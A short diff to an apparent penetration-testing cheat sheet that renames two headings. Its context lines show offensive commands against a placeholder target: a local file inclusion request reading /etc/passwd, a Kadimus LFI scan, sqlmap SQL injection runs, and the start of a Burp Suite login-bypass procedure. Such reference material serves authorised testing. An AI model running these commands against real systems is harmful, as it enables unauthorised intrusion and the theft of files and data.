@@ -332,7 +332,7 @@ curl -s http://INSERTIPADDRESS/gallery.php?page=/etc/passwd
 /root/Tools/Kadimus/kadimus -u http://INSERTIPADDRESS/example.php?page=
 ```
 
-#### SQLInjection
+#### SQL-Injection
 
 ```
 # Post
@@ -345,7 +345,7 @@ sqlmap -u "http://INSERTIPADDRESS/index.php?id=1" --dbms=mysql
 sqlmap -u http://INSERTIPADDRESS --dbms=mysql --crawl=3
 ```
 
-#### Login-bypass
+#### Sql-login-bypass
 
 - Open Burp-suite
 - Make and intercept a request
